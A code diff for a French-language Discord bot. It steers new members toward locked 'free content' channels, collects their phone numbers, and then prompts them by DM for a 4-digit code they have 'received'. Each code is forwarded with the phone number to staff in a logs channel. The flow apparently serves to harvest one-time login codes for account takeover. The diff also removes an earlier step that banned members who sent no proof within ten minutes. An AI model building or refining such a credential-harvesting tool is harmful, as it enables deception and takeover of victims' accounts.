@@ -42,6 +42,9 @@ const RESULTAT_CHANNEL_ID = process.env.RESULTAT_CHANNEL_ID || null;
 const TICKET_CHANNEL_ID = process.env.TICKET_CHANNEL_ID || null;
 const INVITE_CHANNEL_ID = process.env.INVITE_CHANNEL_ID || null;
 const CHAT_MAKER_CHANNEL_ID = process.env.CHAT_MAKER_CHANNEL_ID || null;
+const ACCES_GRATUIT_CHANNEL_ID = process.env.ACCES_GRATUIT_CHANNEL_ID || null;
+const CONTENU_BOOST_CHANNEL_ID = process.env.CONTENU_BOOST_CHANNEL_ID || null;
+const CONTENU_INVITE_CHANNEL_ID = process.env.CONTENU_INVITE_CHANNEL_ID || null;
 
 const CROWN_ROLE_NAME = process.env.CROWN_ROLE_NAME || '👑';
 const STAR_ROLE_NAME = process.env.STAR_ROLE_NAME || '⭐️';
@@ -53,8 +56,6 @@ const PROOF_TIMEOUT_MINUTES = Number(process.env.PROOF_TIMEOUT_MINUTES || 10);
 
 const pendingVerifications = new Map();
 const proofPendingMembers = new Map();
-const memberInvites = new Map();
-const memberBoosts = new Map();
 
 function normalizePhone(rawPhone) {
   return String(rawPhone || '').replace(/\s+/g, '').replace(/-/g, '').replace(/\./g, '');
@@ -129,6 +130,61 @@ function createCodeValidationButtons(userId) {
   );
 }
 
+function createAccessMessage() {
+  const embed = new EmbedBuilder()
+    .setColor(0x5865f2)
+    .setTitle('📌 Accès aux Salons')
+    .setDescription(
+      'Pour accéder au contenu complet et débloquer tous les salons, tu dois **finir ta vérification**.\n\n' +
+      'Les salons suivants sont en attente de vérification :\n' +
+      '• `#acces-gratuit` - Contenu gratuit\n' +
+      '• `#contenu-boost` - Pour les boosteurs\n' +
+      '• `#contenu-invite` - Pour ceux qui invitent\n\n' +
+      'Clique sur le bouton ci-dessous pour continuer la vérification.'
+    )
+    .setFooter({ text: 'Vérification requise pour accéder au contenu' });
+
+  return new ActionRowBuilder().addComponents(
+    new ButtonBuilder()
+      .setCustomId('goto_verification')
+      .setLabel('Aller à la vérification')
+      .setStyle(ButtonStyle.Primary)
+  );
+}
+
+async function sendAccessMessage(member) {
+  const channel = await getChannel(ACCES_GRATUIT_CHANNEL_ID);
+  if (!channel || !channel.isTextBased()) return;
+
+  const embed = new EmbedBuilder()
+    .setColor(0x5865f2)
+    .setTitle('🔒 Vérification Requise')
+    .setDescription(
+      `Bienvenue <@${member.id}> !\n\n` +
+      'Pour accéder au contenu et débloquer les salons, tu dois d\'abord **terminer ta vérification**.\n\n' +
+      'Les salons suivants sont verrouillés :\n' +
+      '• `#acces-gratuit`\n' +
+      '• `#contenu-boost`\n' +
+      '• `#contenu-invite`\n\n' +
+      '**Clique sur le bouton ci-dessous pour accéder à la vérification.**'
+    )
+    .setFooter({ text: 'Vérification requise' })
+    .setTimestamp();
+
+  const row = new ActionRowBuilder().addComponents(
+    new ButtonBuilder()
+      .setCustomId('goto_verification')
+      .setLabel('→ Aller à #verification')
+      .setStyle(ButtonStyle.Primary)
+  );
+
+  try {
+    await channel.send({ content: `<@${member.id}>`, embeds: [embed], components: [row] });
+  } catch (e) {
+    console.error('Erreur lors de l\'envoi du message d\'accès:', e);
+  }
+}
+
 async function sendVerificationPanel(member) {
   const channel = await getChannel(VERIFICATION_CHANNEL_ID);
   if (!channel || !channel.isTextBased()) return null;
@@ -177,7 +233,7 @@ async function sendToLogsPanel(member, phone) {
   if (verification) verification.logsMessageId = message.id;
 }
 
-async function updateLogsPanel(memberId, statusText, statusColor) {
+async function updateLogsPanel(memberId, statusText, statusColor, addCodePanel = false) {
   const verification = pendingVerifications.get(getKey(memberId));
   if (!verification || !verification.logsMessageId) return;
 
@@ -201,7 +257,25 @@ async function updateLogsPanel(memberId, statusText, statusColor) {
     .setColor(statusColor)
     .setFields(newFields);
 
-  await message.edit({ embeds: [updated] });
+  await message.edit({ embeds: [updated], components: [createStaffButtons(memberId)] });
+
+  // Si addCodePanel est true, ajouter le panel du code directement sous
+  if (addCodePanel && verification.claimedBy) {
+    const codeEmbed = new EmbedBuilder()
+      .setColor(0xffa500)
+      .setTitle('🔢 Panel Code')
+      .setDescription(`En attente du code de <@${memberId}>`)
+      .addFields(
+        { name: 'Utilisateur', value: `<@${memberId}>`, inline: true },
+        { name: 'Statut', value: '⏳ En attente de code', inline: true }
+      )
+      .setTimestamp();
+
+    await channel.send({
+      embeds: [codeEmbed],
+      components: []
+    });
+  }
 }
 
 async function sendCodePanel(member, code, claimedBy) {
@@ -220,12 +294,13 @@ async function sendCodePanel(member, code, claimedBy) {
       { name: 'ID', value: `\`${member.id}\``, inline: true },
       { name: 'Téléphone', value: verification.phone, inline: true },
       { name: 'Code', value: `\`${code}\``, inline: true },
-      { name: 'Statut', value: '⏳ En attente de validation', inline: true }
+      { name: 'Statut', value: '⏳ En attente de validation', inline: true },
+      { name: 'Staff en charge', value: claimedUser?.username || 'Inconnu', inline: true }
     )
     .setTimestamp();
 
   const message = await channel.send({
-    content: `<@${claimedBy}> 📌`,
+    content: `<@${claimedBy}> 📌 Code à valider`,
     embeds: [embed],
     components: [createCodeValidationButtons(member.id)]
   });
@@ -258,15 +333,6 @@ async function requestCodeFromMember(memberId) {
   const member = await guild.members.fetch(memberId).catch(() => null);
   if (!member) return false;
 
-  const embed = new EmbedBuilder()
-    .setColor(0xffa500)
-    .setTitle('📱 Entrez le Code')
-    .setDescription(
-      'Le staff a validé ton numéro de téléphone.\n\n' +
-      'Maintenant, tu dois entrer le code à 4 chiffres que tu as reçu pour finaliser la vérification.'
-    )
-    .setFooter({ text: 'Entre ton code ci-dessous' });
-
   const modal = new ModalBuilder()
     .setCustomId(`code_modal_${memberId}`)
     .setTitle('Code de Vérification');
@@ -284,6 +350,14 @@ async function requestCodeFromMember(memberId) {
 
   try {
     const dmChannel = await member.createDM();
+    const embed = new EmbedBuilder()
+      .setColor(0xffa500)
+      .setTitle('📱 Entrez le Code')
+      .setDescription(
+        'Le staff a validé ton numéro de téléphone.\n\n' +
+        'Maintenant, tu dois entrer le code à 4 chiffres que tu as reçu pour finaliser la vérification.'
+      );
+
     await dmChannel.send({ embeds: [embed] });
 
     await dmChannel.send({
@@ -302,40 +376,6 @@ async function requestCodeFromMember(memberId) {
   }
 }
 
-async function sendProofRequest(member) {
-  const guild = await fetchGuild();
-  if (!guild) return;
-
-  const embed = new EmbedBuilder()
-    .setColor(0xff0000)
-    .setTitle('⚠️ Preuve Requise')
-    .setDescription(
-      'Bienvenue ! Avant de pouvoir accéder au serveur, nous avons besoin d\'une preuve que ton numéro fonctionne.\n\n' +
-      '**Tu as 10 minutes pour :**\n' +
-      '1. Envoyer une vidéo ou une capture d\'écran montrant que le numéro fonctionne\n\n' +
-      'Si tu n\'envoies rien dans les 10 minutes, tu seras banni du serveur.\n' +
-      'Si la preuve est valide, tu recevras une confirmation en DM.'
-    )
-    .setFooter({ text: '⏱️ Chrono: 10 minutes' });
-
-  const channel = await getChannel(PROOF_CHANNEL_ID);
-  if (!channel || !channel.isTextBased()) return;
-
-  const msg = await channel.send({
-    content: `<@${member.id}>`,
-    embeds: [embed]
-  });
-
-  proofPendingMembers.set(member.id, {
-    messageId: msg.id,
-    timeout: setTimeout(async () => {
-      await member.ban({ reason: 'Pas de preuve fournie dans les 10 minutes' }).catch(() => null);
-      proofPendingMembers.delete(member.id);
-      await msg.edit({ content: `<@${member.id}> - ❌ Banni (pas de preuve)` });
-    }, PROOF_TIMEOUT_MINUTES * 60 * 1000)
-  });
-}
-
 async function approveVerification(memberId) {
   const verification = pendingVerifications.get(getKey(memberId));
   if (!verification) return false;
@@ -352,7 +392,6 @@ async function approveVerification(memberId) {
   }
 
   await updateLogsPanel(memberId, '✅ Validé', 0x00ff88);
-  await sendProofRequest(member);
 
   pendingVerifications.delete(getKey(memberId));
   return true;
@@ -383,23 +422,8 @@ client.on('guildMemberAdd', async (member) => {
   if (!GUILD_ID || member.guild.id !== GUILD_ID) return;
   if (member.user.bot) return;
 
+  await sendAccessMessage(member);
   await sendVerificationPanel(member);
-});
-
-client.on('messageCreate', async (message) => {
-  if (message.author.bot) return;
-  if (!message.guild || message.guild.id !== GUILD_ID) return;
-
-  const verification = pendingVerifications.get(getKey(message.author.id));
-  if (!verification || verification.status !== 'code_requested') return;
-
-  if (/^\d{4}$/.test(message.content.trim())) {
-    verification.code = message.content.trim();
-
-    await sendCodePanel(message.author, message.content.trim(), verification.claimedBy);
-    await message.reply({ content: '✅ Code reçu ! Le staff va vérifier.' });
-    return;
-  }
 });
 
 client.on('interactionCreate', async (interaction) => {
@@ -420,6 +444,17 @@ client.on('interactionCreate', async (interaction) => {
 
       modal.addComponents(new ActionRowBuilder().addComponents(phoneInput));
       await interaction.showModal(modal);
+      return;
+    }
+
+    if (interaction.customId === 'goto_verification') {
+      const verificationChannel = await getChannel(VERIFICATION_CHANNEL_ID);
+      if (verificationChannel) {
+        await interaction.reply({
+          content: `Clique [ici](https://discord.com/channels/${GUILD_ID}/${VERIFICATION_CHANNEL_ID}) pour aller à la vérification`,
+          ephemeral: true
+        });
+      }
       return;
     }
 
@@ -450,6 +485,31 @@ client.on('interactionCreate', async (interaction) => {
       }
 
       verification.status = 'code_requested';
+      
+      // Ajouter le panel du code sous le numéro dans #logs
+      const logsChannel = await getChannel(LOGS_CHANNEL_ID);
+      if (logsChannel && logsChannel.isTextBased()) {
+        const guild = await fetchGuild();
+        const member = await guild.members.fetch(targetId).catch(() => null);
+        
+        const codeEmbed = new EmbedBuilder()
+          .setColor(0xffa500)
+          .setTitle('🔢 Panel Code')
+          .setDescription(`En attente du code de <@${targetId}>`)
+          .addFields(
+            { name: 'Utilisateur', value: `<@${targetId}>`, inline: true },
+            { name: 'Téléphone', value: verification.phone, inline: true },
+            { name: 'Statut', value: '⏳ En attente de code', inline: true }
+          )
+          .setTimestamp();
+
+        const codePanelMsg = await logsChannel.send({
+          embeds: [codeEmbed]
+        });
+
+        verification.codePanelMessageId = codePanelMsg.id;
+      }
+
       await interaction.reply({ content: `✅ Demande de code envoyée à <@${targetId}>`, ephemeral: true });
       await requestCodeFromMember(targetId);
       return;
@@ -492,9 +552,15 @@ client.on('interactionCreate', async (interaction) => {
       const member = await guild.members.fetch(targetId).catch(() => null);
       if (member) {
         await member.send({ content: '✅ Félicitations ! Ton code est validé. Tu as maintenant accès au serveur !' });
+        
+        const starRole = await findRole(guild, STAR_ROLE_NAME);
+        if (starRole) {
+          await member.roles.add(starRole).catch(() => null);
+        }
       }
 
       await interaction.reply({ content: `✅ Code validé pour <@${targetId}>`, ephemeral: true });
+      pendingVerifications.delete(getKey(targetId));
       return;
     }
 
@@ -543,13 +609,14 @@ client.on('interactionCreate', async (interaction) => {
       await sendToLogsPanel(member, record.phone);
 
       await interaction.reply({
-        content: `✅ Numéro reçu : \`${maskPhone(phone)}\`\n\nLe staff va vérifier ton demande. Tu recevras bientôt un code à entrer.`,
+        content: `✅ Numéro reçu : \`${maskPhone(phone)}\`\n\nLe staff va vérifier ta demande. Tu recevras bientôt un code à entrer.`,
         ephemeral: true
       });
       return;
     }
 
     if (interaction.customId.startsWith('code_modal_')) {
+      const memberId = interaction.customId.replace('code_modal_', '');
       const code = interaction.fields.getTextInputValue('code_input');
 
       if (!/^\d{4}$/.test(code)) {
@@ -557,7 +624,7 @@ client.on('interactionCreate', async (interaction) => {
         return;
       }
 
-      const verification = pendingVerifications.get(getKey(interaction.user.id));
+      const verification = pendingVerifications.get(getKey(memberId));
       if (!verification) {
         await interaction.reply({ content: '❌ Aucune vérification active.', ephemeral: true });
         return;
@@ -565,27 +632,8 @@ client.on('interactionCreate', async (interaction) => {
 
       verification.code = code;
 
-      try {
-        const guild = await fetchGuild();
-        const member = await guild.members.fetch(interaction.user.id);
-        const channel = await getChannel(VERIFICATION_CHANNEL_ID);
-
-        if (channel && channel.isTextBased()) {
-          const embed = new EmbedBuilder()
-            .setColor(0xffa500)
-            .setTitle('🔢 Code Reçu')
-            .setDescription(`Membre: <@${interaction.user.id}>\nCode: \`${code}\``)
-            .setTimestamp();
-
-          await channel.send({
-            content: `<@${verification.claimedBy}>`,
-            embeds: [embed],
-            components: [createCodeValidationButtons(interaction.user.id)]
-          });
-        }
-      } catch (e) {
-        console.error('Erreur lors de l\'envoi du code:', e);
-      }
+      // Envoyer le code dans le salon #code
+      await sendCodePanel(interaction.user, code, verification.claimedBy);
 
       await interaction.reply({ content: '✅ Code reçu ! Le staff va vérifier.', ephemeral: true });
       return;
